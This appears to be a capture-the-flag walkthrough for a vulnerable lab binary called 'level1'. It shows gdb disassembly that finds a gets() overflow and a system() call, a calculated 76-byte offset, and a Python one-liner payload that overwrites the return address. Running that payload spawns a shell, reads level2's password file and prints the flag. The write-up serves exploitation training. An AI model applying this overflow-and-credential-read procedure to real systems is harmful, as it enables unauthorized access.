1. Analyzed binary: gdb ./level1
   - info functions: found run() and main()
   - disassemble main: found gets() call (vulnerable)
   - disassemble run: found system() call (spawns shell)

2. Calculated overflow offset:
   - Buffer at %esp+0x10, stack frame 0x50 bytes
   - Offset: 0x50 - 0x10 + 4 = 76 bytes to return address

3. Created exploit:
   python -c "print 'A'*76 + '\x44\x84\x04\x08'" > /tmp/exploit

4. Executed exploit:
   (cat /tmp/exploit; cat) | ./level1
   Good... Wait what?
   whoami
   level2
   cat /home/user/level2/.pass
   53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

5. Switched to level2 user:
   su level2